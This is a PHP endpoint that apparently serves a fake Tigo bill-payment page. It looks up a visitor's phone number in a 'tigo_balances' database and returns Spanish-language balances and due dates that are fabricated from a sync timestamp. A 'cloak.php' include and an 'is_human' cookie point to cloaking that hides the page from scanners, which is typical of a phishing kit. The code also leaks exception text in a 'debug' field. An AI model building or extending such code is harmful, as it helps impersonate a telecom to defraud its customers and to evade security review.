<?php
ob_start();
header("Content-Type: application/json; charset=utf-8");
require_once "security.php";
require_once __DIR__ . "/config/cloak.php";
set_time_limit(30);
ini_set("display_errors", 0);

try {
    $inputRaw = file_get_contents("php://input");
    $input = json_decode($inputRaw, true);
    $value = $input["value"] ?? "";

    if (empty($value)) {
        ob_clean(); echo json_encode(["success" => false, "message" => "Ingrese un número válido"]);
        exit;
    }

    $config_db = include "config_db.php";
    $dbUrl = $config_db['db_url'];
    $urlParts = parse_url($dbUrl);
    $dbHost = $urlParts['host'];
    $dbPort = $urlParts['port'] ?? 5432;
    $dbName = ltrim($urlParts['path'], '/');
    $dbUser = $urlParts['user'];
    $dbPass = $urlParts['pass'];

    $endpointId = explode('.', $dbHost)[0];
    $dsn = "pgsql:host=$dbHost;port=$dbPort;dbname=$dbName;sslmode=require;options='endpoint=$endpointId'";
    $pdo = new PDO($dsn, $dbUser, $dbPass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);

    // Buscar por número
    $stmt = $pdo->prepare("SELECT * FROM tigo_balances WHERE number = :val LIMIT 1");
    $stmt->execute([':val' => $value]);
    $row = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($row) {
        $balance = (float)$row['balance'];
        $status = $row['status']; // "Con factura" o "Al día"
        
        if ($status === 'Al día' || $balance <= 0) {
            ob_clean(); echo json_encode([
                "success" => true,
                "status" => "up_to_date",
                "message" => "Estás al día con tus pagos de Tigo. 🎉"
            ]);
        } else {
            // Formatear moneda
            $fmtBalance = "$ " . number_format($balance, 0, ',', '.');
            ob_clean(); echo json_encode([
                "success" => true,
                "status" => "debt",
                "balance" => $fmtBalance,
                "dueDate" => date("d/m/Y", strtotime($row['last_sync'] . " + 15 days")), // Fecha estimada
                "invoices" => [
                    [
                        "line" => $value,
                        "amount" => $fmtBalance,
                        "amountRaw" => $balance,
                        "dueDate" => date("d/m/Y", strtotime($row['last_sync'] . " + 5 days"))
                    ]
                ]
            ]);
        }
        // Marcar humano
        cloak_set_cookie("is_human", "true");
    } else {
        ob_clean(); echo json_encode([
            "success" => false, 
            "status" => "not_found", 
            "message" => "El número $value no tiene facturas pendientes en nuestra base de datos."
        ]);
    }

} catch (Exception $e) {
    ob_clean(); echo json_encode([
        "success" => false, 
        "message" => "Error de conexión temporal con la base de datos.",
        "debug" => $e->getMessage()
    ]);
}
